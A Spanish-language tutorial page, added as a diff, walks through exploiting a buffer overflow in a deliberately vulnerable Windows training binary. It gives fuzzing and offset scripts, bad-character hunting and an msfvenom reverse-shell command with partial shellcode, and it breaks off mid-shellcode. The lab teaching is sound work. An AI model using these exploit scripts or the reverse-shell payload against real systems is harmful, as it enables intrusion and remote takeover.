@@ -1,0 +1,532 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Buffer Overflow Windows x86</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Buffer Overflow Windows x86" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Explotación de Buffer Overflow en un binario de 32 de Windows" />
+<meta property="og:description" content="Explotación de Buffer Overflow en un binario de 32 de Windows" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Buffer Overflow Windows x86" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Buffer Overflow Windows x86" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Explotación de Buffer Overflow en un binario de 32 de Windows","headline":"Explotación de Buffer Overflow en un binario de 32 de Windows","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Buffer Overflow Windows x86</h1>
+          <p>Explotación de Buffer Overflow en un binario de 32 de Windows</p>
+        </div>
+
+<div><strong><h3>Preparación</h3></strong></div><br>
+
+<div><p>Iniciaremos descargando un binario .exe vulnerable en mi caso use <a href="https://github.com/justinsteven/dostackbufferoverflowgood/raw/master/dostackbufferoverflowgood.exe" target="_blank">dostackbufferoverflowgood.exe</a></p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">dir</span><span class="p">
+
+    Directorio: C:\Users\pc1\Desktop
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----     14/01/2023  04:12 p. m.          13312 example.exe
+
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutarlo nos dice que está en espera de alguna conexión, pero... ¿en que puerto?</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">.\example.exe</span><span class="p">
+[+] Listening for connections.</span>
+</code></pre></div></div><br>
+
+
+<div><p>En otra consola con netstat podemos ver que example.exe se esta corriendo en el puerto 31337</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">netstat </span><span class="c1">-ab</span><span class="p"> | </span><span class="no">Select-String </span><span class="na">"example" </span><span class="c1">-Context </span><span class="p">1</span><span class="c1">,</span><span class="p">0
+
+    TCP    0.0.0.0:</span><span class="na">31337</span><span class="p">          GatoGamer1155:0        LISTENING
+>  </span><span class="s2">[example.exe]</span>
+</code></pre></div></div><br>
+
+<div><p>Podemos conectarnos con netcat y por cada input que enviamos nos devuelve un 'hello' con el</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat </span><span class="p">192.168.204.1 31337
+test
+Hello test!!!</span>
+</code></pre></div></div><br>
+
+<div><p>En donde está corriendo el archivo .exe nos muestra los bytes que recibe y los bytes que devuelve</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="no">.\example.exe</span><span class="p">
+[+] Listening for connections.
+Received connection from remote host.
+Connection handed off to handler thread.
+Bytes received: 5
+Bytes sent: 14</span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Explotación</h3></strong></div><br>
+
+<div><p>Iniciamos por crear un script con pwntools para saber con cuantos bytes se corrompe el programa</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket, time</span>
+</code></pre></div></div><br>
+
+<div><p>Creamos un array con el nombre buffer que de momento no vale nada, y un contador que vale 100</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket, time
+buffer </span><span class="kd">=</span><span class="p"> [</span><span class="k">b</span><span class="s2">""</span><span class="p">]
+counter </span><span class="kd">=</span><span class="na"> 100</span>
+</code></pre></div></div><br>
+
+<div><p>Haremos un append de A por el contador a buffer 32 veces, cada vez el contador aumentara 100</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket, time
+buffer </span><span class="kd">=</span><span class="p"> [</span><span class="k">b</span><span class="s2">""</span><span class="p">]
+counter </span><span class="kd">=</span><span class="na"> 100
+
+</span><span class="kd">while </span><span class="k">len</span><span class="p">(buffer) </span><span class="kd">< </span><span class="na">32</span><span class="p">:
+    buffer.append(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> counter)
+    counter </span><span class="kd">+=</span><span class="na"> 100</span>
+</code></pre></div></div><br>
+
+<div><p>Crearemos una conexión con la máquina victima y por cada valor del array enviaremos la data y un salto de linea, mientrás la conexión concluya sin romperse la barra nos mostrará cuantos bytes se estan enviando, si se corrompe y pierde la conexión nos mostrará cuantos bytes se enviaron</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket, time
+buffer </span><span class="kd">=</span><span class="p"> [</span><span class="k">b</span><span class="s2">""</span><span class="p">]
+counter </span><span class="kd">=</span><span class="na"> 100
+
+</span><span class="kd">while </span><span class="k">len</span><span class="p">(buffer) </span><span class="kd">< </span><span class="na">32</span><span class="p">:
+    buffer.append(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> counter)
+    counter </span><span class="kd">+=</span><span class="na"> 100</span><span class="kd">
+
+for</span><span class="p"> strings</span><span class="kd"> in</span><span class="p"> buffer:
+    </span><span class="kd">try</span><span class="p">:
+        time.sleep(</span><span class="na">1</span><span class="p">)
+        bar.status(</span><span class="k">f</span><span class="s2">"Enviando: {len(strings)} bytes"</span><span class="p">)
+
+        shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">31337</span><span class="p">))
+
+        shell.send(strings </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)
+
+        shell.recv(</span><span class="na">1024</span><span class="p">)
+        shell.close()
+
+    </span><span class="kd">except</span><span class="p">:
+        log.success(</span><span class="k">f</span><span class="s2">"El programa se detuvo al enviar: {len(strings)} bytes"</span><span class="p">)
+        exit()</span>
+</code></pre></div></div><br>
+
+<div><p>Corremos el script pero curiosamente el programa se ha corrompido al enviar solo 200 bytes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">↖</span><span class="p">] Enviando: 200 bytes
+[</span><span class="s2">+</span><span class="p">] El programa se detuvo al enviar: 200 bytes</span>
+</code></pre></div></div><br>
+
+<div><p>Necesitamos saber la cantidad de bytes antes de llegar el EIP, asi que creamos un patrón con la herramienta pattern_create de metasploit</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ pattern_create </span><span class="p">-l 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span>
+</code></pre></div></div><br>
+
+<div><p>Ahora modificaremos el script para que envie el patrón creado y el salto de linea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket
+
+pattern </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"</span><span class="p">
+
+log.info(</span><span class="s2">"Enviando pattern ..."</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">31337</span><span class="p">))
+
+shell.send(pattern </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<div><p>Ahora lo que necesitamos es controlar el EIP, para esto usaremos <a href="https://www.immunityinc.com/products/debugger/">Immunity Debugger</a></p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a><br>
+
+<div><p>En File > Open tenemos la opción de ingrsar un .exe, ingresamos el nuestro</p></div>
+<div><p><img src="./2.png"><p></div><br>
+
+<div><p>Una vez abierto le damos al botón de play y el programa estará corriendo</p></div>
+<div><p><img src="./3.png"><p></div><br>
+
+<div><p>Ahora ejecutamos nuestro exploit para que envie el patrón y sobreescriba registros</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">*</span><span class="p">] Enviando pattern ...</span>
+</code></pre></div></div><br>
+
+<div><p>En el apartado de registros lo que nos interesa es EIP y podemos ver que ahora vale 39654138</p></div>
+<div><p><img src="./4.png"><p></div><br>
+
+<div><p>Con la herramienta pattern_offset podemos ver el offset que son 146 bytes antes de llegar al EIP</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ pattern_offset </span><span class="p">-q 39654138
+[</span><span class="na">*</span><span class="p">] Exact match at offset 146</span>
+</code></pre></div></div><br>
+
+<div><p>Podemos comprobarlo haciendo un script que envie 146 A y 4 B, EIP tendria que valer 42424242</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket
+
+offset </span><span class="kd">=</span><span class="na"> 146</span><span class="p">
+junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A" </span><span class="kd">*</span><span class="p"> offset
+eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B" </span><span class="kd">*</span><span class="na"> 4</span><span class="p">
+
+log.info(</span><span class="s2">"Enviando payload ..."</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">31337</span><span class="p">))
+
+shell.send(junk </span><span class="kd">+</span><span class="p"> eip </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<div><p>Podemos darle a atrás para que nos reinicie el servicio y volvemos a correrlo</p></div>
+<div><p><img src="./5.png"><p></div><br>
+
+<div><p>Corremos el script para enviar el payload y EIP vale 42424242, tenemos el control sobre el EIP</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">*</span><span class="p">] Enviando payload ...</span>
+</code></pre></div>
+<div><p><img src="./6.png"><p></div><br>
+
+<p><div>Ahora necesitamos detectar badchars, usaremos <a href="https://github.com/corelan/mona">mona</a> asi que definimos un directorio de trabajo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">!mona config -set workfolder C:\Users\pc1\Desktop\%p</span>
+</code></pre></div>
+<div><p><img src="./7.png"><p></div><br>
+
+<p><div>Creamos un 'bytearray' con mona y el bytearray no los guarda en un .txt y un .bin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">!mona bytearray</span>
+</code></pre></div>
+<a href="./8.png" target="_blank"><div><p><img src="./8.png"><p></div></a>
+<div><p><img src="./9.png"><p></div><br>
+
+<p><div>Modificamos el script para que también nos envie toda la cadena de posibles badchars</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket
+
+offset </span><span class="kd">=</span><span class="na"> 146</span><span class="p">
+junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A" </span><span class="kd">*</span><span class="p"> offset
+eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B" </span><span class="kd">*</span><span class="na"> 4</span><span class="p">
+
+badchars </span><span class="kd">=  </span><span class="k">b</span><span class="s2">""</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"</span><span class="p">
+badchars </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span><span class="p">
+
+log.info(</span><span class="s2">"Enviando posibles badchars ..."</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">31337</span><span class="p">))
+
+shell.send(junk </span><span class="kd">+</span><span class="p"> eip </span><span class="kd">+</span><span class="p"> badchars </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p><div>Al ejecutar el script se enviará toda la cadena de posibles badchars</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">*</span><span class="p">] Enviando posibles badchars ...</span>
+</code></pre></div></div><br>
+
+<p><div>Ahora en los registros lo que buscamos es la dirección del ESP que vale 00A619E8</p></div>
+<div><p><img src="./10.png"><p></div><br>
+
+<p><div>Al pasarle el bytearray.bin y la dirección del ESP a mona compare nos detecta 00 como badchar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">!mona compare -f bytearray.bin -a 00A619E8</span>
+</code></pre></div></div><br>
+<div><p><img src="./11.png"><p></div><br>
+
+<blockquote><strong><div><p>¡Importante para ahorrar tiempo y esfuerzo!</p></div></strong>
+<div><p>Generalmente en todos los binarios de Windows el caracter \x00 será badchar asi que puedes empezar creando el bytearray sin el y considerarlo un badchar desde un inicio<p></div></blockquote><br>
+
+
+<p><div>Creamos de nuevo un bytearray sin \x00 y modificamos el script anterior de la siguiente forma<p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">!mona bytearray -cpb "\x00"</span>
+</code></pre></div>
+<a href="./12.png" target="_blank"><div><p><img src="./12.png"><p></div></a>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket
+
+offset </span><span class="kd">=</span><span class="na"> 146</span><span class="p">
+junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A" </span><span class="kd">*</span><span class="p"> offset
+eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B" </span><span class="kd">*</span><span class="na"> 4</span><span class="p">
+
+badchars </span><span class="kd">=  </span><span class="k">b</span><span class="s2">""</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span><span class="p">
+
+log.info(</span><span class="s2">"Enviando posibles badchars ..."</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">31337</span><span class="p">))
+
+shell.send(junk </span><span class="kd">+</span><span class="p"> eip </span><span class="kd">+</span><span class="p"> badchars </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p><div>Ejecutamos el script, el mona compare con los valores y podemos ver a \x0a como badchar<p></div>
+<div><p><img src="./13.png"><p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">!mona compare -f bytearray.bin -a 00A919E8</span>
+</code></pre></div></div>
+<div><p><img src="./14.png"><p></div><br>
+
+<p><div>Repetimos el mismo proceso otra vez, crear el bytearray y modificar el script con el nuevo bytearray<p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">!mona bytearray -cpb "\x00\x0a"</span>
+</code></pre></div>
+<a href="./15.png" target="_blank"><div><p><img src="./15.png"><p></div></a>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket
+
+offset </span><span class="kd">=</span><span class="na"> 146</span><span class="p">
+junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A" </span><span class="kd">*</span><span class="p"> offset
+eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B" </span><span class="kd">*</span><span class="na"> 4</span><span class="p">
+
+badchars </span><span class="kd">=  </span><span class="k">b</span><span class="s2">""</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"</span><span class="p">
+badchars </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span><span class="p">
+
+log.info(</span><span class="s2">"Enviando posibles badchars ..."</span><span class="p">)
+
+shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+shell.connect((</span><span class="s2">"192.168.204.1"</span><span class="p">, </span><span class="na">31337</span><span class="p">))
+
+shell.send(junk </span><span class="kd">+</span><span class="p"> eip </span><span class="kd">+</span><span class="p"> badchars </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\r\n"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p><div>Ejecutamos de nuevo el script y mona compare, pero esta vez nos dice unmodified</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">*</span><span class="p">] Enviando posibles badchars ...</span>
+</code></pre></div></div>
+<div><p><img src="./16.png"><p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">!mona compare -f bytearray.bin -a 00BF19E8</span>
+</code></pre></div></div>
+<div><p><img src="./17.png"><p></div><br>
+
+
+<blockquote><strong><div><p>Repetir repetir y volver a repetir ... ¡Unmonified!</p></div></strong>
+<div><p>Este proceso puede llegar a ser un poco tedioso ya que hay binarios que tienen muchos badchars, pero como se puede ver el proceso no es muy complicado y es exactamente el mismo solo es repetirlo hasta que recibamos el mensaje de unmonified<p></div></blockquote><br>
+
+<p><div>Listamos los modulos y vemos que el .exe tiene casi todas las protecciones desactivadas</div></p>
+<a href="./18.png" target="_blank"><div><p><img src="./18.png"><p></div></a><br>
+
+<p><div>Ya que controlamos EIP podemos hacer un jmp a ESP, para buscar esto en el .exe nos apoyaremos de nasm_shell de metasploit para ver su valor que es \xff\xe4</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nasm_shell
+</span><span class="kd">nasm ></span><span class="p"> jmp ESP
+00000000  </span><span class="na">FFE4</span><span class="p">                jmp esp</span>
+</code></pre></div></div><br>
+
+<p><div>Ahora buscaremos ese salto en el .exe como modulo, obtenemos 2 direcciones</div></p>
+<div><p><img src="./19.png"><p></div><br>
+
+<p><div>Nos quedamos con la primera pero como estamos en little endian tenemos que darle vuelta</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">0x080414c3     </span><span class="p">--></span><span class="na">     \x08\x04\x14\xc3     </span><span class="p">--></span><span class="na">     \xc3\x14\x04\x08</span>
+</code></pre></div></div><br>
+
+<p><div>Ahora creamos un shellcode con msfvenom pasandole los 2 badchars que encontramos</div></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=192.168.193.128 LPORT=443 EXITFUNC=thread -a x86 -b</span><span class="no"> "\x00\x0a"</span><span class="p"> -f python -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Payload size: 351 bytes
+Final size of python file: 1965 bytes
+shellcode =  b""
+shellcode += b"\xd9\xc6\xd9\x74\x24\xf4\x5d\xba\x8a\xe7\x9d"
+shellcode += b"\xc1\x2b\xc9\xb1\x52\x83\xc5\x04\x31\x55\x13"
+shellcode += b"\x03\xdf\xf4\x7f\x34\x23\x12\xfd\xb7\xdb\xe3"
